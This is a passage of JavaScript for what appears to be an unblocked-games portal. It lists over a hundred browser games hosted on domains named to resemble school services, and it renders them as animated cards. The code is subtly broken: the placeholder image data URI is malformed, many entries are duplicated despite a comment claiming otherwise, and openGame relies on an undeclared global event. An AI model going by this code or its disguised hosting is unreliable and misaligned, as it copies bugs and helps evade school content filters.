            'Clicker': ['Cookie Clicker', 'Adventure Capitalist', 'Capybara Clicker', 'Spacebar Clicker'],
            'Party': ['Basket Random', 'Boxing Random', 'Soccer Random', 'Volley Random', 'Just Fall LOL', 'Elastic Face'],
            'Physics': ['Ragdoll Archers', 'Scrap Metal 3', 'Stackball'],
            'Sports': ['1on1 Soccer', 'Retro Bowl', 'Basketball Stars', 'Basket Random', 'Boxing Random'],
            'Stickman': ['Stickman Hook', 'Stickman Bike', 'Crazy Bikes']
        };

        const gamesData = [
            // NEW GAMES ADDED
            { url: 'https://storage.classroomsarecool.mex.com/snowball-io/index.html', title: 'Snowball.io', image: 'https://storage.classroomsarecool.mex.com/images/snowballio.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bottle-flip-3d/index.html', title: 'Bottle Flip 3D', image: 'https://storage.classroomsarecool.mex.com/images/bottleflip.png' },
            { url: 'https://storage.classroomsarecool.mex.com/aquaparkcars.html', title: 'Aqua Park.io', image: 'https://storage.classroomsarecool.mex.com/images/aquaparkcars.png' },
            { url: 'https://storage.classroomsarecool.mex.com/paperio3.html', title: 'Paper.io 3D', image: 'https://storage.classroomsarecool.mex.com/images/paperio3.png' },
            { url: 'https://storage.classroomsarecool.mex.com/slope-2/index.html', title: 'Slope.io 2', image: 'https://storage.classroomsarecool.mex.com/images/slope2.png' },
            { url: 'https://storage.classroomsarecool.mex.com/plantsvszombies/plants%20vs%20zombies.html', title: 'Plants vs Zombies', image: 'https://storage.classroomsarecool.mex.com/images/plantsvszombies.png' },
            { url: 'https://storage.classroomsarecool.mex.com/papery-planes/index.html', title: 'Papery Planes', image: 'https://storage.classroomsarecool.mex.com/images/paperyplanes.png' },
            { url: 'https://storage.classroomsarecool.mex.com/mr-bullet/index.html', title: 'Mr Bullet', image: 'https://storage.classroomsarecool.mex.com/images/mrbullet.png' },
            { url: 'https://storage.classroomsarecool.mex.com/idle-restaurants/index.html', title: 'Idle Restaurants', image: 'https://storage.classroomsarecool.mex.com/images/idleresturanttycoon.png' },
            { url: 'https://storage.classroomsarecool.mex.com/gswitch-3/index.html', title: 'G-Switch 3', image: 'https://storage.classroomsarecool.mex.com/images/gswitch3.png' },
            { url: 'https://storage.classroomsarecool.mex.com/fruitninja/index.html', title: 'Fruit Ninja', image: 'https://storage.classroomsarecool.mex.com/images/fruitninja.png' },
            { url: 'https://storage.classroomsarecool.mex.com/drift-boss/index.html', title: 'Drift Boss', image: 'https://storage.classroomsarecool.mex.com/images/driftboss.png' },
            { url: 'https://storage.classroomsarecool.mex.com/draw-the-hill/index.html', title: 'Draw the Hill', image: 'https://storage.classroomsarecool.mex.com/images/drawthehill.png' },
            { url: 'https://storage.classroomsarecool.mex.com/d/index.html', title: 'Epic Stunt Cars', image: 'https://storage.classroomsarecool.mex.com/images/epicstuntcars.png' },
            { url: 'https://storage.classroomsarecool.mex.com/cars-simulator/index.html', title: 'Cars Simulator', image: 'https://storage.classroomsarecool.mex.com/images/carssimulator.png' },
            { url: 'https://storage.classroomsarecool.mex.com/candycrushsaga.html', title: 'Candy Crush', image: 'https://storage.classroomsarecool.mex.com/images/candycrushsaga.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bottle-flip/index.html', title: 'Bottle Flip 3D', image: 'https://storage.classroomsarecool.mex.com/images/bottleflip3d.png' },
            { url: 'https://storage.classroomsarecool.mex.com/Ball-Hop/index.html', title: 'Ball Hop', image: 'https://storage.classroomsarecool.mex.com/images/ballhop.png' },
            { url: 'https://storage.classroomsarecool.mex.com/angrybirds/index.html', title: 'Angry Birds', image: 'https://storage.classroomsarecool.mex.com/images/angrybirds.png' },
            { url: 'https://storage.classroomsarecool.mex.com/a/index.html', title: 'Only Up', image: 'https://storage.classroomsarecool.mex.com/images/onlyupball.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bank/index.html', title: 'Bank Robbery 1', image: 'https://storage.classroomsarecool.mex.com/images/bankrobbery.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bank-robbery-2/index.html', title: 'Bank Robbery 2', image: 'https://storage.classroomsarecool.mex.com/images/bankrobbery2.png' },
            { url: 'https://storage.classroomsarecool.mex.com/ks2teams/index.html', title: 'KS2 Teams', image: '' },
            { url: 'https://storage.classroomsarecool.mex.com/motox3m2/index.html', title: 'Moto X3M 2', image: 'https://storage.classroomsarecool.mex.com/images/motox3m2.png' },
            { url: 'https://storage.classroomsarecool.mex.com/flappybasketball/index.html', title: 'Flappy Basketball', image: 'https://storage.classroomsarecool.mex.com/images/flappybasketball.png' },
            { url: 'https://storage.classroomsarecool.mex.com/ultimatecardriving/index.html', title: 'Ultimate Car Driving', image: 'https://storage.classroomsarecool.mex.com/images/ultimatecardriving.png' },
            { url: 'https://storage.classroomsarecool.mex.com/carparkingmaster/index.html', title: 'Car Parking Master', image: 'https://storage.classroomsarecool.mex.com/images/carparkingmaster.png' },
            { url: 'https://storage.classroomsarecool.mex.com/gunfest/index.html', title: 'Gun Fest', image: 'https://storage.classroomsarecool.mex.com/images/gunfest.png' },
            { url: 'https://storage.classroomsarecool.mex.com/spacewaves/index.html', title: 'Space Waves', image: 'https://storage.classroomsarecool.mex.com/images/spacewaves.png' },
            { url: 'https://storage.classroomsarecool.mex.com/stacksurfer/index.html', title: 'Stack Surfer', image: 'https://storage.classroomsarecool.mex.com/images/stacksurfer.png' },
            { url: 'https://storage.classroomsarecool.mex.com/realflightsimulator/index.html', title: 'Real Flight Simulator', image: 'https://storage.classroomsarecool.mex.com/images/realflightsimulator.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bicycleridersimulator/index.html', title: 'Bicycle Riders Simulator', image: 'https://storage.classroomsarecool.mex.com/images/bicycleridersimulator.png' },
            { url: 'https://storage.classroomsarecool.mex.com/granny/index.html', title: 'Granny', image: 'https://storage.classroomsarecool.mex.com/images/granny.png' },
            { url: 'https://storage.classroomsarecool.mex.com/gdunity/index.html', title: 'Geometry Dash', image: 'https://storage.classroomsarecool.mex.com/images/gdunity.png' },
            { url: 'https://storage.classroomsarecool.mex.com/moneyrush/index.html', title: 'Money Rush', image: 'https://storage.classroomsarecool.mex.com/images/moneyrush.png' },

            // CLASSIC CLICKER GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/cookieclicker.html', title: 'Cookie Clicker', image: 'https://myapps.classlink.courter.com/images/games/cookieclicker-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/adventurecapitalist.html', title: 'Adventure Capitalist', image: 'https://myapps.classlink.courter.com/images/games/adventurecapitalist-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/capybaraclicker.html', title: 'Capybara Clicker', image: 'https://myapps.classlink.courter.com/images/games/capybaraclicker-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/spacebarclicker.html', title: 'Spacebar Clicker', image: 'https://myapps.classlink.courter.com/images/games/spacebarclicker-min.png' },

            // ACTION & MOTORBIKE GAMES
            { url: 'https://storage.classroomsarecool.mex.com/Moto-X3M/index.html', title: 'Moto X3M', image: 'https://storage.classroomsarecool.mex.com/images/motox3m.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/motox3m3', title: 'Moto X3M 3', image: 'https://myapps.classlink.courter.com/images/games/motox3m-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/motox3mspooky.html', title: 'Moto X3M Spooky', image: 'https://myapps.classlink.courter.com/images/games/motox3mspooky.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/motox3mwinter.html', title: 'Moto X3M Winter', image: 'https://myapps.classlink.courter.com/images/games/motox3mwinter.jpeg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/motox3mpool.html', title: 'Moto X3M Pool Party', image: 'https://myapps.classlink.courter.com/images/games/motox3mpoolparty.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/turbomotoracer.html', title: 'Turbo Moto Racer', image: 'https://myapps.classlink.courter.com/images/games/turbomotoracer-min.jpg' },

            // RACING & DRIVING GAMES
            { url: 'https://storage.classroomsarecool.mex.com/snowrider3d/index.html', title: 'Snow Rider 3D', image: 'https://storage.classroomsarecool.mex.com/images/snowrider3d.png' },
            { url: 'https://storage.classroomsarecool.mex.com/highwayriderextreme.html', title: 'Highway Rider Extreme', image: 'https://storage.classroomsarecool.mex.com/images/highwayriderextreme.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/drifthunters.html', title: 'Drift Hunters', image: 'https://myapps.classlink.courter.com/images/games/drifhunters-min.jpg' },
            { url: 'https://storage.classroomsarecool.mex.com/crazy-cars/index.html', title: 'Crazy Cars', image: 'https://storage.classroomsarecool.mex.com/images/crazycars.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/mrracer.html', title: 'Mr Racer', image: 'https://myapps.classlink.courter.com/images/games/mrracer.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/arcadecardrift.html', title: 'Arcade Car Drift', image: 'https://myapps.classlink.courter.com/images/games/arcadecardrift-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/racesurvival.html', title: 'Race Survival', image: 'https://myapps.classlink.courter.com/images/games/racesurvival.jpg' },

            // MULTIPLAYER & PARTY GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/1v1lol.html', title: '1v1.lol', image: 'https://myapps.classlink.courter.com/images/games/1v1lol-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/2drocketleague.html', title: '2D Rocket League', image: 'https://myapps.classlink.courter.com/images/games/2drocketleague-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/rocketsoccerderby.html', title: 'Rocket Soccer Derby', image: 'https://myapps.classlink.courter.com/images/games/rocketsocderby-min.png' },
            { url: 'https://storage.classroomsarecool.mex.com/paperio2/index.html', title: 'Paper.io 2', image: 'https://storage.classroomsarecool.mex.com/images/paperio2.png' },
            { url: 'https://storage.classroomsarecool.mex.com/holeio.html', title: 'Hole.io', image: 'https://storage.classroomsarecool.mex.com/images/holeio.png' },
            { url: 'https://storage.classroomsarecool.mex.com/slope/index.html', title: 'Slope.io', image: 'https://storage.classroomsarecool.mex.com/images/slope.png' },

            // PHYSICS & RAGDOLL GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/ragdollarchers.html', title: 'Ragdoll Archers', image: 'https://myapps.classlink.courter.com/images/games/ragdollarchers-min.png' },
            { url: 'https://storage.classroomsarecool.mex.com/eggy-car/index.html', title: 'Eggy Car', image: 'https://storage.classroomsarecool.mex.com/images/eggycar.png' },
            { url: 'https://storage.classroomsarecool.mex.com/death-run-3d/index.html', title: 'Death Run 3D', image: 'https://storage.classroomsarecool.mex.com/images/deathrun3d.png' },
            { url: 'https://storage.classroomsarecool.mex.com/tombofthemask.html', title: 'Tomb of the Mask', image: 'https://storage.classroomsarecool.mex.com/images/tombofthemask.png' },

            // PROBLEM SOLVING PUZZLES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/blockblast.html', title: 'Block Blast', image: 'https://myapps.classlink.courter.com/images/games/blockblast-min.jpg' },
            { url: 'https://storage.classroomsarecool.mex.com/skibidi-strike/index.html', title: 'Skibidi Strike', image: 'https://storage.classroomsarecool.mex.com/images/skibidistrike.png' },
            { url: 'https://storage.classroomsarecool.mex.com/pixelshooter/index.html', title: 'Pixel Shooter', image: 'https://storage.classroomsarecool.mex.com/images/pixelshooter.png' },
            { url: 'https://storage.classroomsarecool.mex.com/fruitninja/index.html', title: 'Fruit Ninja', image: 'https://storage.classroomsarecool.mex.com/images/fruitninja.png' },

            // PLATFORMER GAMES
            { url: 'https://storage.classroomsarecool.mex.com/gswitch-3/index.html', title: 'G-Switch 3', image: 'https://storage.classroomsarecool.mex.com/images/gswitch3.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/vex3m.html', title: 'Vex 3', image: 'https://myapps.classlink.courter.com/images/games/vex3m.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/doodlejump.html', title: 'Doodle Jump', image: 'https://myapps.classlink.courter.com/images/games/doodlejump-min.png' },
            { url: 'https://storage.classroomsarecool.mex.com/geometrydash/index.html', title: 'Geometry Dash Lite', image: 'https://storage.classroomsarecool.mex.com/images/geometrydashlite.png' },

            // RETRO & CLASSIC GAMES
            { url: 'https://storage.classroomsarecool.mex.com/pacman/index.html', title: 'Pac-Man', image: 'https://storage.classroomsarecool.mex.com/images/pacman.png' },
            { url: 'https://storage.classroomsarecool.mex.com/sm64/index.html', title: 'Super Mario 64', image: 'https://storage.classroomsarecool.mex.com/images/supermario64.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/superhot.html', title: 'Super Hot', image: 'https://myapps.classlink.courter.com/images/games/superhot.png' },
            { url: 'https://storage.classroomsarecool.mex.com/googlesnake.html', title: 'Google Snake', image: 'https://storage.classroomsarecool.mex.com/images/googlesnake.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/chess.html', title: 'Chess', image: 'https://myapps.classlink.courter.com/images/games/chess-min.png' },

            // SIMULATION GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/bitlife.html', title: 'BitLife', image: 'https://myapps.classlink.courter.com/images/games/bitlife-min.jpg' },
            { url: 'https://storage.classroomsarecool.mex.com/retro-bowl/index.html', title: 'Retro Bowl', image: 'https://storage.classroomsarecool.mex.com/images/retrobowl.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/cellmachine.html', title: 'Cell Machine', image: 'https://myapps.classlink.courter.com/images/games/cell-machine-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/badtimesimulator.html', title: 'Bad Time Simulator', image: 'https://myapps.classlink.courter.com/images/games/badtimesimulator-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/tanukisunset.html', title: 'Tanuki Sunset', image: 'https://myapps.classlink.courter.com/images/games/tanukisunset-min.png' },

            // HORROR & SCARY GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/backrooms.html', title: 'Backrooms', image: 'https://myapps.classlink.courter.com/images/games/backrooms-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/baldis.html', title: 'Baldi\'s Basics', image: 'https://myapps.classlink.courter.com/images/games/baldisbasics-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/deadlydecent.html', title: 'Deadly Decent', image: 'https://myapps.classlink.courter.com/images/games/deadlydecent-min.png' },

            // MUSIC & RHYTHM GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/adanceoffireandice.html', title: 'A Dance of Fire and Ice', image: 'https://myapps.classlink.courter.com/images/games/a-dance-of-fire-and-ice-min.png' },
            { url: 'https://storage.classroomsarecool.mex.com/jetpack-joyride/index.html', title: 'Jetpack Joyride', image: 'https://storage.classroomsarecool.mex.com/images/jetpackjoyride.png' },

            // ONLINE MULTIPLAYER GAMES
            { url: 'https://storage.classroomsarecool.mex.com/subwaysurfers-sf/index.html', title: 'Subway Surfers', image: 'https://storage.classroomsarecool.mex.com/images/subwaysurfers.png' },
            { url: 'https://storage.classroomsarecool.mex.com/basketball-stars/index.html', title: 'Basketball Stars', image: 'https://storage.classroomsarecool.mex.com/images/basketballstars.png' },
            { url: 'https://storage.classroomsarecool.mex.com/rooftop-snipers/index.html', title: 'Rooftop Snipers', image: 'https://storage.classroomsarecool.mex.com/images/rooftopsnipers.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/policechase.html', title: 'Police Chase', image: 'https://myapps.classlink.courter.com/images/games/policechase-min.png' },

            // RUNNING & PARKOUR GAMES
            { url: 'https://storage.classroomsarecool.mex.com/minecraftparkour/index.html', title: 'Minecraft Parkour', image: 'https://storage.classroomsarecool.mex.com/images/minecraftparkour.png' },
            { url: 'https://storage.classroomsarecool.mex.com/crossyroad/index.html', title: 'Crossy Road', image: 'https://storage.classroomsarecool.mex.com/images/crossyroad.png' },

            // RANDOM & PARTY GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/basketrandom.html', title: 'Basket Random', image: 'https://myapps.classlink.courter.com/images/games/basketrandom-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/boxingrandom.html', title: 'Boxing Random', image: 'https://myapps.classlink.courter.com/images/games/boxingrandom-min.png' },
            { url: 'https://storage.classroomsarecool.mex.com/terraria.html', title: 'terraria', image: 'https://storage.classroomsarecool.mex.com/images/terraria.png' },
            { url: 'https://storage.classroomsarecool.mex.com/sandboxels/index.html', title: 'sand boxels', image: 'https://storage.classroomsarecool.mex.com/images/sandboxels.png' },
            { url: 'https://storage.classroomsarecool.mex.com/smash-it/index.html', title: 'smash it', image: 'https://storage.classroomsarecool.mex.com/images/smashit.png' },
            { url: 'https://storage.classroomsarecool.mex.com/csdust/index.html', title: 'csdust', image: 'https://storage.classroomsarecool.mex.com/images/csdust.png' },
            { url: 'https://storage.classroomsarecool.mex.com/rescuethefish/index.html', title: 'rescue the fish', image: 'https://storage.classroomsarecool.mex.com/images/rescuethefish.png' },
            { url: 'https://storage.classroomsarecool.mex.com/drawwire/index.html', title: 'draw wire', image: 'https://storage.classroomsarecool.mex.com/images/drawwire.png' },
            { url: 'https://storage.classroomsarecool.mex.com/marblerun3d/index.html', title: 'marble run 3d', image: 'https://storage.classroomsarecool.mex.com/images/marblerun3d.png' },
            { url: 'https://storage.classroomsarecool.mex.com/crazycattle3d/index.html', title: 'crazy cattle 3d', image: 'https://storage.classroomsarecool.mex.com/images/crazycattle3d.png' },
            { url: 'https://storage.classroomsarecool.mex.com/cs1.6/index.html', title: 'cs1 1.6', image: 'https://storage.classroomsarecool.mex.com/images/cs1.6.png' },
            { url: 'https://storage.classroomsarecool.mex.com/zombiederby/index.html', title: 'zombie derby', image: 'https://storage.classroomsarecool.mex.com/images/zombiederby.png' },
            { url: 'https://storage.classroomsarecool.mex.com/rooftopsnipers2/index.html', title: 'rooftop snipers 2', image: 'https://storage.classroomsarecool.mex.com/images/rooftopsnipers2.png' },
            { url: 'https://storage.classroomsarecool.mex.com/monkeymart/index.html', title: 'monkey mart', image: 'https://storage.classroomsarecool.mex.com/images/monkeymart.png' },
            { url: 'https://storage.classroomsarecool.mex.com/littlealchemy/index.html', title: 'little alchemy', image: 'https://storage.classroomsarecool.mex.com/images/littlealchemy.png' },
            { url: 'https://storage.classroomsarecool.mex.com/buildnowgg/index.html', title: 'buildnow gg', image: 'https://storage.classroomsarecool.mex.com/images/buildnowgg.png' },
            { url: 'https://storage.classroomsarecool.mex.com/crazymotorcycle/index.html', title: 'crazy motorcycle', image: 'https://storage.classroomsarecool.mex.com/images/crazymotorcycle.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bikeofhellspeedobby/index.html', title: 'bike of hell', image: 'https://storage.classroomsarecool.mex.com/images/bikeofhellspeedobby.png' },
            { url: 'https://storage.classroomsarecool.mex.com/deadrails/index.html', title: 'dead rails', image: 'https://storage.classroomsarecool.mex.com/images/deadrails.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/ducklingsio.html', title: 'ducklings.io', image: 'https://myapps.classlink.courter.com/images/games/ducklingsio-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/webglfluid.html', title: 'webgl fluid', image: 'https://myapps.classlink.courter.com/images/games/webglfluid.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/gladihoppers.html', title: 'gladihoppers', image: 'https://myapps.classlink.courter.com/images/games/gladihoppers-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/soccerrandom.html', title: 'Soccer Random', image: 'https://myapps.classlink.courter.com/images/games/soccerrandom.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/volleyrandom.html', title: 'Volley Random', image: 'https://myapps.classlink.courter.com/images/games/volleyrandom-min.png' },

            // DIRTY & FUNNY GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/justfalllol.html', title: 'Just Fall LOL', image: 'https://myapps.classlink.courter.com/images/games/justfalllol.png' },
            { url: 'https://storage.classroomsarecool.mex.com/elasticface/index.html', title: 'Elastic Face', image: 'https://storage.classroomsarecool.mex.com/images/elasticface.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/skyriders.html', title: 'Sky Riders', image: 'https://myapps.classlink.courter.com/images/games/skyriders-min.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/redvsbluez.html', title: 'Red VS Bluez', image: 'https://myapps.classlink.courter.com/images/games/redvsblue-min.png' },

            // STICKMAN GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/stickmanhook.html', title: 'Stickman Hook', image: 'https://myapps.classlink.courter.com/images/games/stickmanhook.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/stickmanbike.html', title: 'Stickman Bike', image: 'https://myapps.classlink.courter.com/images/games/stickmanbike-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/crazybikes.html', title: 'Crazy Bikes', image: 'https://myapps.classlink.courter.com/images/games/crazybikes-min.png' },
            { url: 'https://storage.classroomsarecool.mex.com/gunspin/index.html', title: 'Gunspin', image: 'https://storage.classroomsarecool.mex.com/images/gunspin.png' },

            // BIKES & OBSTACLE GAMES
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/bikeobby.html', title: 'Bike Obby', image: 'https://tr.rbxcdn.com/180DAY-0aee4808db5c1ebae4fa0c0edae0d78c/768/432/Image/Webp/noFilter' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/escaperoad.html', title: 'Escape Road', image: 'https://myapps.classlink.courter.com/images/games/escaperoad-min.png' },
            { url: 'https://storage.classroomsarecool.mex.com/slow-roads/index.html', title: 'Slow Roads', image: 'https://storage.classroomsarecool.mex.com/images/slowroads.png' },

            // MISC GAMES
            { url: 'https://storage.classroomsarecool.mex.com/scrapmetal/index.html', title: 'Scrap Metal 3', image: '' },
            { url: 'https://storage.classroomsarecool.mex.com/cuttherope-Timetravel/index.html', title: 'Cut the Rope: Time Travel', image: 'https://storage.classroomsarecool.mex.com/images/cuttherope.png' },
            { url: 'https://storage.classroomsarecool.mex.com/clusterrush/index.html', title: 'Cluster Rush', image: 'https://storage.classroomsarecool.mex.com/images/clusterrush.png' },
            { url: 'https://storage.classroomsarecool.mex.com/timeshooter3.html', title: 'Time Shooter 3', image: 'https://storage.classroomsarecool.mex.com/images/timeshooter3.png' },
            { url: 'https://storage.classroomsarecool.mex.com/stackball/index.html', title: 'Stackball', image: 'https://storage.classroomsarecool.mex.com/images/stackball.png' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/spiralroll.html', title: 'Spiral Roll', image: 'https://myapps.classlink.courter.com/images/games/spiralroll-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/dune.html', title: 'Dune', image: 'https://myapps.classlink.courter.com/images/games/dune-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/dayofmeatradiation.html', title: 'Day of Meat: Radiation', image: 'https://myapps.classlink.courter.com/images/games/dayofmeatradiation-min.jpg' },
            { url: 'https://myapps.classlink.courter.com/assets/mainstorage/1on1soccer.html', title: '1on1 Soccer', image: 'https://myapps.classlink.courter.com/images/games/1on1soccer-min.jpg' },
            { url: 'https://storage.classroomsarecool.mex.com/bank/index.html', title: 'Bank Robbery 1', image: 'https://storage.classroomsarecool.mex.com/images/bankrobbery.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bank-robbery-2/index.html', title: 'Bank Robbery 2', image: 'https://storage.classroomsarecool.mex.com/images/bankrobbery2.png' },
            { url: 'https://storage.classroomsarecool.mex.com/ks2teams/index.html', title: 'KS2 Teams', image: '' },
            { url: 'https://storage.classroomsarecool.mex.com/motox3m2/index.html', title: 'Moto X3M 2', image: 'https://storage.classroomsarecool.mex.com/images/motox3m2.png' },
            { url: 'https://storage.classroomsarecool.mex.com/flappybasketball/index.html', title: 'Flappy Basketball', image: 'https://storage.classroomsarecool.mex.com/images/flappybasketball.png' },
            { url: 'https://storage.classroomsarecool.mex.com/ultimatecardriving/index.html', title: 'Ultimate Car Driving', image: 'https://storage.classroomsarecool.mex.com/images/ultimatecardriving.png' },
            { url: 'https://storage.classroomsarecool.mex.com/carparkingmaster/index.html', title: 'Car Parking Master', image: 'https://storage.classroomsarecool.mex.com/images/carparkingmaster.png' },
            { url: 'https://storage.classroomsarecool.mex.com/gunfest/index.html', title: 'Gun Fest', image: 'https://storage.classroomsarecool.mex.com/images/gunfest.png' },
            { url: 'https://storage.classroomsarecool.mex.com/spacewaves/index.html', title: 'Space Waves', image: 'https://storage.classroomsarecool.mex.com/images/spacewaves.png' },
            { url: 'https://storage.classroomsarecool.mex.com/stacksurfer/index.html', title: 'Stack Surfer', image: 'https://storage.classroomsarecool.mex.com/images/stacksurfer.png' },
            { url: 'https://storage.classroomsarecool.mex.com/realflightsimulator/index.html', title: 'Real Flight Simulator', image: 'https://storage.classroomsarecool.mex.com/images/realflightsimulator.png' },
            { url: 'https://storage.classroomsarecool.mex.com/bicycleridersimulator/index.html', title: 'Bicycle Riders Simulator', image: 'https://storage.classroomsarecool.mex.com/images/bicycleridersimulator.png' },
            { url: 'https://storage.classroomsarecool.mex.com/granny/index.html', title: 'Granny', image: 'https://storage.classroomsarecool.mex.com/images/granny.png' },
            { url: 'https://storage.classroomsarecool.mex.com/gdunity/index.html', title: 'Geometry Dash', image: 'https://storage.classroomsarecool.mex.com/images/gdunity.png' },
            { url: 'https://storage.classroomsarecool.mex.com/moneyrush/index.html', title: 'Money Rush', image: 'https://storage.classroomsarecool.mex.com/images/moneyrush.png' }
        ];

        // Games collection optimized (duplicates removed, variants consolidated)

        // Games collection optimized (duplicates removed, unwanted games filtered)

        let currentGamesData = [...gamesData];

        function initializeGamesPage() {
            populateGamesGrid(currentGamesData);
            setupGamesControls();
        }

        function populateGamesGrid(games) {
            const gamesGrid = document.getElementById('gamesGrid');
            gamesGrid.innerHTML = '';

            games.forEach((game, index) => {
                // Create the container for advanced animations
                const gameCardContainer = document.createElement('div');
                gameCardContainer.className = 'game-card-container';

                // Create tracker grid for zone detection (10x10 invisible grid)
                const tracker = document.createElement('div');
                tracker.className = 'game-card-tracker';

                // Create 10x10 grid of divs for precise mouse tracking
                for (let i = 0; i < 100; i++) {
                    const trackerCell = document.createElement('div');
                    trackerCell.setAttribute('data-index', i);
                    tracker.appendChild(trackerCell);
                }

                // Create the advanced 3D game card
                const gameCard = document.createElement('div');
                gameCard.className = 'game-card game-card-advanced';
                gameCard.style.animationDelay = `${index * 0.1}s`;

                const imageUrl = game.image && game.image.trim() !== '' ?
                    game.image :
                    'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUwIiBoZWlnaHQ9IjE4MCIgdmlld0JveD0iMCAwIDI1MCAxODAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyNTAiIGhlaWdodD0iMTgwIiBmaWxsPSIjMDAxMTEwIi8+Cjx0ZXh0IHg9IjEyNSIgeT0iOTAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiMwMGZmNDIiIGZvbnQtZmFtaWx5PSJBcmlhbCwgc2Fucy1zZXJpZiIgZm9udC1zaXplPSIxOCI+U1RZTEUgUEFTU0VEXAo=</9UCg==';

                const thumbDiv = document.createElement('div');
                thumbDiv.className = 'game-thumb';
                thumbDiv.style.background = `center/cover no-repeat url('${imageUrl}')`;

                gameCard.appendChild(thumbDiv);

                const captionDiv = document.createElement('div');
                captionDiv.className = 'game-caption';
                captionDiv.textContent = game.title;

                gameCard.appendChild(captionDiv);

                // Add mouse tracking for 3D transforms
                gameCardContainer.addEventListener('mousemove', handleCardMouseMove);
                gameCardContainer.addEventListener('mouseleave', handleCardMouseLeave);

                gameCard.addEventListener('click', () => openGame(game.url, game.title));

                // Assemble the structure
                gameCardContainer.appendChild(tracker);
                gameCardContainer.appendChild(gameCard);
                gamesGrid.appendChild(gameCardContainer);
            });
        }

        // Advanced 3D card animation handlers
        function handleCardMouseMove(e) {
            const container = e.currentTarget;
            const rect = container.getBoundingClientRect();
            const centerX = rect.left + rect.width / 2;
            const centerY = rect.top + rect.height / 2;

            const mouseX = e.clientX;
            const mouseY = e.clientY;

            // Determine zone based on mouse position relative to center
            let zone = 'middle-center';

            if (mouseX < centerX - rect.width * 0.25) {
                if (mouseY < centerY - rect.height * 0.25) zone = 'top-left';
                else if (mouseY > centerY + rect.height * 0.25) zone = 'bottom-left';
                else zone = 'middle-left';
            } else if (mouseX > centerX + rect.width * 0.25) {
                if (mouseY < centerY - rect.height * 0.25) zone = 'top-right';
                else if (mouseY > centerY + rect.height * 0.25) zone = 'bottom-right';
                else zone = 'middle-right';
            } else {
                if (mouseY < centerY - rect.height * 0.25) zone = 'top-center';
                else if (mouseY > centerY + rect.height * 0.25) zone = 'bottom-center';
            }

            // Set the zone data attribute
            container.setAttribute('data-zone', zone);
        }

        function handleCardMouseLeave(e) {
            const container = e.currentTarget;
            container.removeAttribute('data-zone');
        }

        function openGame(url, title) {
            // Show loading effect on the card
            const gameCard = event.currentTarget;
            gameCard.style.transform = 'scale(0.95)';
            gameCard.style.opacity = '0.7';

            // Log the launch attempt
            console.log(` Launching: ${title} -> ${url}`);

            // Show game iframe overlay
            showGameIframe(url, title);

            // Reset card appearance
            setTimeout(() => {
                gameCard.style.transform = '';
                gameCard.style.opacity = '';
            }, 300);
        }

        function showGameIframe(url, title) {
            const overlay = document.getElementById('gameIframeOverlay');
            const container = document.getElementById('gameIframeContainer');
